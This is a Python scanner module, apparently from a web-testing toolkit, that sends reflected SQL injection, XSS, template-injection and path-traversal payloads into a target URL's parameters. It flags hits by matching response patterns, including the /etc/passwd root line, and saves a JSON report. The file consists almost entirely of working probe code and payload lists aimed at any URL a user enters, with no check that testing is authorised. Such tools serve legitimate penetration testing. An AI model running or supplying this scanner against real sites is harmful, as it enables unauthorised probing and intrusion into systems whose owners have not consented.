#!/usr/bin/env python3
"""Injection pack — reflected SQLi/XSS/SSTI/LFI probes (passive confirmation)."""
from __future__ import annotations

import re
from typing import List, Tuple
from urllib.parse import parse_qs, urlparse

from core_utils import (
    C,
    get,
    inject,
    normalize_url,
    params_from_url,
    pause,
    preflight_attack,
    print_finding,
    save_json_report,
    session,
)

SQLI = [
    ("'", "syntax|sql|mysql|ora-|postgresql|odbc|sqlite", "sqli-error"),
    ("\"", "syntax|sql|mysql|ora-|postgresql", "sqli-error"),
    ("1 OR 1=1-- ", "syntax|sql", "sqli-boolean"),
    ("1' OR '1'='1", "syntax|sql", "sqli-boolean"),
]

XSS = [
    ("<script>alert(1)</script>", re.escape("<script>alert(1)</script>")),
    ("\"><img src=x onerror=alert(1)>", r"<img src=x onerror=alert\(1\)>"),
    ("'\"><svg/onload=alert(1)>", r"<svg/onload=alert\(1\)>"),
]

SSTI = [
    ("{{7*7}}", r"(?<!\d)49(?!\d)"),
    ("${7*7}", r"(?<!\d)49(?!\d)"),
    ("<%= 7*7 %>", r"(?<!\d)49(?!\d)"),
]

LFI = [
    ("../../../../etc/passwd", r"root:.*:0:0:"),
    ("....//....//....//etc/passwd", r"root:.*:0:0:"),
    ("/etc/passwd", r"root:.*:0:0:"),
]


def probe(url: str, proxies=None, headers=None, delay: float = 0.0) -> List[dict]:
    findings: List[dict] = []
    params = params_from_url(url)
    if not params:
        # invent common param if none
        params = ["id", "q", "page", "file", "search", "name"]
        base = url
        if "?" not in base:
            base = base.rstrip("/") + "/?id=1"
        url = base
        params = params_from_url(url) or ["id"]

    s = session(timeout=10, proxies=proxies, headers=headers)
    if delay:
        import time as _time
        _time.sleep(delay)
    baseline = get(s, url, allow_redirects=True, timeout=10)
    base_text = (baseline.text if baseline else "") or ""

    for param in params:
        for payload, pattern, kind in SQLI:
            test = inject(url, param, payload)
            r = get(s, test, allow_redirects=True, timeout=10)
            body = (r.text if r else "") or ""
            if re.search(pattern, body, re.I) and not re.search(pattern, base_text, re.I):
                f = {"type": kind, "param": param, "payload": payload, "url": test}
                findings.append(f)
                print_finding("SQLi-ish", f"{param}={payload}", test, "high")

        for payload, pattern in XSS:
            test = inject(url, param, payload)
            r = get(s, test, allow_redirects=True, timeout=10)
            body = (r.text if r else "") or ""
            if re.search(pattern, body, re.I):
                f = {"type": "xss-reflected", "param": param, "payload": payload, "url": test}
                findings.append(f)
                print_finding("XSS reflected", f"{param}", payload, "high")

        for payload, pattern in SSTI:
            test = inject(url, param, payload)
            r = get(s, test, allow_redirects=True, timeout=10)
            body = (r.text if r else "") or ""
            if re.search(pattern, body) and "49" not in base_text:
                f = {"type": "ssti", "param": param, "payload": payload, "url": test}
                findings.append(f)
                print_finding("SSTI", f"{param}={payload}", test, "high")

        for payload, pattern in LFI:
            test = inject(url, param, payload)
            r = get(s, test, allow_redirects=True, timeout=10)
            body = (r.text if r else "") or ""
            if re.search(pattern, body):
                f = {"type": "lfi", "param": param, "payload": payload, "url": test}
                findings.append(f)
                print_finding("LFI", f"{param}={payload}", test, "critical")

    return findings


def run(url: str = None):
    print(f"\n{C.PURP}{C.B}  Injection Pack (SQLi / XSS / SSTI / LFI){C.R}\n")
    url = normalize_url(url or input(f"{C.AQUA}[?] URL with params: {C.R}"))
    if not url:
        pause()
        return
    cfg = preflight_attack()
    print(f"{C.GOLD}[*] Probing {url} ...{C.R}")
    findings = probe(url, proxies=cfg["proxies"], headers=cfg["headers"], delay=cfg["delay"])
    print(f"\n{C.NEON}[+] Findings: {len(findings)}{C.R}")
    path = save_json_report("injection_pack", {"url": url, "findings": findings})
    print(f"{C.GREEN}[+] Saved: {path}{C.R}")
    pause()


if __name__ == "__main__":
    run()
